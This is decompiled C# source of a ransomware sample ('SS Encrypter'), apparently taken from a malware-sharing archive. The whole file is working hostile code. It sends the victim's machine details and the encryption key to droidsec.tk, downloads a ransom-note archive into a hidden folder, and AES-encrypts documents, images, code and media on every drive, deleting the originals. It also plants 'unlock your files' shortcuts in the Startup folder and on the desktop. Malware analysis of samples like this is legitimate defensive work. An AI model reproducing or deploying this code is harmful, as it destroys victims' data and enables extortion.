// Decompiled with JetBrains decompiler
// Type: SS_Encrypter.Program
// Assembly: SS Encrypter, Version=1.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: 68AE5369-564D-45CA-B9AF-307E132869E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-3d13bbe7750e38414ba19fd51fe8a253d791edb6a923af31fe5d56ae17af0eec.exe

using IpInfo;
using SharpCompress.Common;
using SharpCompress.Readers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SS_Encrypter
{
  internal class Program
  {
    public static string hostaddr = "http://droidsec.tk/handshake.php";
    public static string AlertMsgLink = "http://droidsec.tk/alertmsg.zip";
    public static string AlertMsgPath = "C:\\Users\\Public\\Windows\\Ui\\";
    public static string AlertMsgFile = Program.AlertMsgPath + "alertmsg.zip";
    public static string passwordkey = "";
    public static string systemid = "";
    public static string HDid = "";

    private static void Main(string[] args)
    {
      Program.passwordkey = GeneratePassword();
      Program.systemid = GenerateSystemId();
      CheckConnection();
      MakeConnection();
      RetriveFiles();
      AlertingUser();
      Console.ReadKey();

      static string GeneratePassword()
      {
        RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
        byte[] inArray = new byte[18];
        byte[] data = inArray;
        cryptoServiceProvider.GetBytes(data);
        return Convert.ToBase64String(inArray);
      }

      static string GenerateSystemId()
      {
        ManagementObjectCollection instances = new ManagementClass("Win32_LogicalDisk").GetInstances();
        string systemId = "";
        foreach (ManagementObject managementObject in instances)
          systemId += Convert.ToString(managementObject["VolumeSerialNumber"]);
        return systemId;
      }

      static bool CheckConnection()
      {
        while (true)
        {
          try
          {
            if (new Ping().Send("www.google.com").Status != IPStatus.Success)
              return false;
            Console.WriteLine("connected");
            return true;
          }
          catch (Exception ex)
          {
            Console.WriteLine("Not Connected");
            Thread.Sleep(2000);
          }
        }
      }

      static void MakeConnection()
      {
        try
        {
          string userName = Environment.UserName;
          string machineName = Environment.MachineName;
          string str1 = DateTime.Now.ToString("HH:mm:ss");
          DateTime dateTime = DateTime.Today;
          string str2 = dateTime.ToString("dd/MM/yyyy");
          dateTime = DateTime.Now;
          string str3 = dateTime.DayOfWeek.ToString();
          string str4 = str2 + ", " + str3;
          string str5 = new WebClient().DownloadString("https://api.ipify.org");
          HttpClient client = new HttpClient();
          Program.HDid = "A125OKA" + Program.systemid + "4758ahzii";
          Program.passwordkey = Program.HDid;
          FormUrlEncodedContent content = new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>) new List<KeyValuePair<string, string>>()
          {
            new KeyValuePair<string, string>("machine_name", machineName),
            new KeyValuePair<string, string>("computer_user", userName),
            new KeyValuePair<string, string>("systemid", Program.systemid),
            new KeyValuePair<string, string>("os", "Windows 10"),
            new KeyValuePair<string, string>("date", str4),
            new KeyValuePair<string, string>("time", str1),
            new KeyValuePair<string, string>("ip", str5),
            new KeyValuePair<string, string>("location", location()),
            new KeyValuePair<string, string>("password", Program.passwordkey),
            new KeyValuePair<string, string>("handshake", "VXpCMk1UTjBjMU14YkhZemNsSTBibk13YlhjMGNqTQ")
          });
          HttpResponseMessage result = client.PostAsync(Program.hostaddr, (HttpContent) content).Result;
          if (result.IsSuccessStatusCode)
          {
            Console.WriteLine((object) result);
            Console.WriteLine(GenerateSystemId());
            Console.WriteLine(GeneratePassword());
          }
          else
            Console.WriteLine("No Connection");

          string location()
          {
            Task<string> currentCityAsync = new IpInfoApi(client).GetCurrentCityAsync();
            Console.WriteLine("City: " + currentCityAsync.Result);
            return currentCityAsync.Result;
          }
        }
        catch (Exception ex)
        {
        }
        try
        {
          StartDownload();
          try
          {
            string newText1 = "<h3  style=\"color: grey; font-size:95% \"> Your System Id is : " + GenerateSystemId() + " </h3>";
            string newText2 = "<h3  style=\"color: white; font-size:110% \"> Your System Id is : " + GenerateSystemId() + " </h3>";
            string fileName1 = "C:\\Users\\Public\\Windows\\Ui\\index.html";
            WriteSystemId(newText1, fileName1, 129);
            string fileName2 = fileName1;
            WriteSystemId(newText2, fileName2, 285);
          }
          catch
          {
            Console.WriteLine("Error While SystemID Writing");
          }
        }
        catch
        {
          Console.WriteLine("Error In Download");
        }
      }

      static void WriteSystemId(string newText, string fileName, int line_to_edit)
      {
        string[] contents = System.IO.File.ReadAllLines(fileName);
        contents[line_to_edit - 1] = newText;
        System.IO.File.WriteAllLines(fileName, contents);
      }

      static bool StartDownload()
      {
        WebClient webClient = new WebClient();
        while (true)
        {
          try
          {
            if (Directory.Exists(Program.AlertMsgPath))
            {
              Directory.Delete(Program.AlertMsgPath, true);
              Directory.CreateDirectory(Program.AlertMsgPath).Attributes = FileAttributes.Hidden | FileAttributes.System;
            }
            else
              Directory.CreateDirectory(Program.AlertMsgPath).Attributes = FileAttributes.Hidden | FileAttributes.System;
            webClient.DownloadFile(Program.AlertMsgLink, Program.AlertMsgFile);
            Thread.Sleep(450);
            Console.WriteLine("Downloaded");
            StartExtraction();
            return true;
          }
          catch (WebException ex)
          {
            Console.WriteLine("Unable to Download\nRetrying Please wait..");
            Thread.Sleep(2000);
          }
        }
      }

      static bool StartExtraction()
      {
        while (true)
        {
          try
          {
            if (!System.IO.File.Exists(Program.AlertMsgFile))
              return false;
            using (Stream stream = (Stream) System.IO.File.OpenRead(Program.AlertMsgFile))
            {
              IReader ireader = ReaderFactory.Open(stream, (ReaderOptions) null);
              while (ireader.MoveToNextEntry())
              {
                if (!ireader.Entry.IsDirectory)
                  IReaderExtensions.WriteEntryToDirectory(ireader, Program.AlertMsgPath, new ExtractionOptions()
                  {
                    ExtractFullPath = true,
                    Overwrite = true
                  });
              }
            }
            return true;
          }
          catch (Exception ex)
          {
          }
        }
      }

      static void RetriveFiles()
      {
        DriveInfo[] drives = DriveInfo.GetDrives();
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string[] strArray = new string[131]
        {
          "*.jpg",
          "*.jpeg",
          "*.jpg",
          "*.tar",
          "*.tar.gz",
          "*.gz",
          "*.raw",
          "*.gif",
          "*.tif",
          "*.gif",
          "*.png",
          "*.bmp",
          "*.3dm",
          "*.max",
          "*.accdb",
          "*.db",
          "*.dbf",
          "*.mdb",
          "*.pdb",
          "*.sql",
          "*.dwg",
          "*.dxf",
          "*.c",
          "*.cpp",
          "*.cs",
          "*.h",
          "*.php",
          "*.asp",
          "*.rb",
          "*.java",
          "*.jar",
          "*.class",
          "*.py",
          "*.js",
          "*.aaf",
          "*.aep",
          "*.aepx",
          "*.plb",
          "*.prel",
          "*.prproj",
          "*.aet",
          "*.ppj",
          "*.psd",
          "*.indd",
          "*.indl",
          "*.indt",
          "*.indb",
          "*.inx",
          "*.idml",
          "*.pmd",
          "*.xqx",
          "*.xqx",
          "*.ai",
          "*.eps",
          "*.ps",
          "*.svg",
          "*.swf",
          "*.fla",
          "*.as3",
          "*.as",
          "*.txt",
          "*.doc",
          "*.dot",
          "*.docx",
          "*.docm",
          "*.dotx",
          "*.dotm",
          "*.docb",
          "*.rtf",
          "*.wpd",
          "*.wps",
          "*.msg",
          "*.pdf",
          "*.xls",
          "*.xlt",
          "*.xlm",
          "*.xlsx",
          "*.xlsm",
          "*.xltx",
          "*.xltm",
          "*.xlsb",
          "*.xla",
          "*.xlam",
          "*.xll",
          "*.xlw",
          "*.ppt",
          "*.pot",
          "*.pps",
          "*.pptx",
          "*.pptm",
          "*.potx",
          "*.potm",
          "*.ppam",
          "*.ppsx",
          "*.ppsm",
          "*.sldx",
          "*.sldm",
          "*.wav",
          "*.mp3",
          "*.aif",
          "*.iff",
          "*.m3u",
          "*.m4u",
          "*.mid",
          "*.mpa",
          "*.wma",
          "*.ra",
          "*.avi",
          "*.mov",
          "*.mp4",
          "*.3gp",
          "*.mpeg",
          "*.3g2",
          "*.asf",
          "*.asx",
          "*.flv",
          "*.mpg",
          "*.wmv",
          "*.vob",
          "*.m3u8",
          "*.mkv",
          "*.dat",
          "*.csv",
          "*.efx",
          "*.sdf",
          "*.vcf",
          "*.xml",
          "*.ses",
          "*.rar",
          "*.zip",
          "*.7zip"
        };
        foreach (DriveInfo driveInfo in drives)
        {
          try
          {
            if (!(driveInfo.Name == "C:\\"))
            {
              string name = driveInfo.Name;
              Console.WriteLine(name);
              foreach (string searchPattern in strArray)
              {
                try
                {
                  foreach (string enumerateDirectory in Directory.EnumerateDirectories(name))
                  {
                    try
                    {
                      foreach (string enumerateFile in Directory.EnumerateFiles(enumerateDirectory, searchPattern, SearchOption.AllDirectories))
                      {
                        string p = enumerateFile;
                        try
                        {
                          new Thread((ThreadStart) (() => FileEncryption(p)))
                          {
                            Priority = ThreadPriority.AboveNormal
                          }.Start();
                        }
                        catch (UnauthorizedAccessException ex)
                        {
                        }
                      }
                    }
                    catch (UnauthorizedAccessException ex)
                    {
                    }
                    catch (Exception ex)
                    {
                    }
                  }
                  foreach (string enumerateFile in Directory.EnumerateFiles(name, searchPattern))
                  {
                    string p = enumerateFile;
                    try
                    {
                      new Thread((ThreadStart) (() => FileEncryption(p)))
                      {
                        Priority = ThreadPriority.AboveNormal
                      }.Start();
                    }
                    catch (UnauthorizedAccessException ex)
                    {
                    }
                  }
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
          catch (Exception ex)
          {
          }
        }
        foreach (string searchPattern in strArray)
        {
          try
          {
            foreach (string enumerateDirectory in Directory.EnumerateDirectories(folderPath))
            {
              try
              {
                foreach (string enumerateFile in Directory.EnumerateFiles(enumerateDirectory, searchPattern, SearchOption.AllDirectories))
                {
                  string p = enumerateFile;
                  try
                  {
                    new Thread((ThreadStart) (() => FileEncryption(p)))
                    {
                      Priority = ThreadPriority.AboveNormal
                    }.Start();
                  }
                  catch (UnauthorizedAccessException ex)
                  {
                  }
                  catch (ArgumentException ex)
                  {
                  }
                }
              }
              catch (UnauthorizedAccessException ex)
              {
              }
            }
            foreach (string enumerateFile in Directory.EnumerateFiles(folderPath, searchPattern))
            {
              string p = enumerateFile;
              try
              {
                new Thread((ThreadStart) (() => FileEncryption(p)))
                {
                  Priority = ThreadPriority.AboveNormal
                }.Start();
              }
              catch (UnauthorizedAccessException ex)
              {
              }
            }
          }
          catch (Exception ex)
          {
          }
        }
      }

      static void FileEncryption(string path)
      {
        byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(path);
        byte[] bytes1 = Encoding.UTF8.GetBytes(Program.passwordkey);
        byte[] hash = SHA256.Create().ComputeHash(bytes1);
        byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, hash);
        string path1 = path + ".ss";
        Console.WriteLine(path + ".ss");
        try
        {
          System.IO.File.WriteAllBytes(path1, bytes2);
          System.IO.File.Delete(path);
        }
        catch
        {
          Console.WriteLine("Error");
        }
      }

      static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
      {
        byte[] salt = passwordBytes;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
          {
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
              cryptoStream.Close();
            }
            return memoryStream.ToArray();
          }
        }
      }

      static void AlertingUser()
      {
        string str1 = "C:\\Users\\Public\\Windows\\Ui\\unlock your files.lnk";
        string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\unlock your files.lnk";
        string str3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\unlock your files.lnk";
        string str4 = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\unlock your files.lnk";
        Process.Start(str1);
        string[] strArray = new string[3]
        {
          str2,
          str3,
          str4
        };
        foreach (string destFileName in strArray)
        {
          try
          {
            System.IO.File.Copy(str1, destFileName);
          }
          catch (Exception ex)
          {
          }
        }
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          try
          {
            System.IO.File.Copy(str1, drive.Name + "\\unlock your files.lnk");
          }
          catch (Exception ex)
          {
          }
        }
        foreach (string enumerateFile in Directory.EnumerateFiles(Program.AlertMsgPath, "*.*", SearchOption.AllDirectories))
        {
          try
          {
            System.IO.File.SetAttributes(enumerateFile, FileAttributes.Hidden | FileAttributes.System);
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
        }
        foreach (string enumerateDirectory in Directory.EnumerateDirectories(Program.AlertMsgPath))
        {
          try
          {
            new DirectoryInfo(enumerateDirectory).Attributes = FileAttributes.Hidden | FileAttributes.System;
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
        }
      }
    }
  }
}
